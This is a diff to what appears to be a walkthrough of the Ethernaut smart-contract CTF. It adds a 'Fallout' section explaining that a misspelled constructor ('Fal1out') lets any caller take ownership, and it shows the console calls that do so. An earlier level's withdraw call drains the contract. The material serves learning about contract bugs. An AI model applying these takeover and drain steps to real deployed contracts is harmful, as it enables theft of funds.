@@ -98,5 +98,18 @@ await contract.owner()
 
 // Reduce balance to 0
 await contract.withdraw()
+```
 
+## <a name='Fallout'></a> 2. Fallout
+> Claim ownership of the contract to complete this level.
+
+The contract's constructor is incorrectly titled `Fal1out` instead of `Fallout`. We can call it to claim ownership.
+
+```js
+
+// Call the function to claim ownership
+contract.Fal1out()
+
+// Verify we have claimed ownership
+await contract.owner() 
 ```
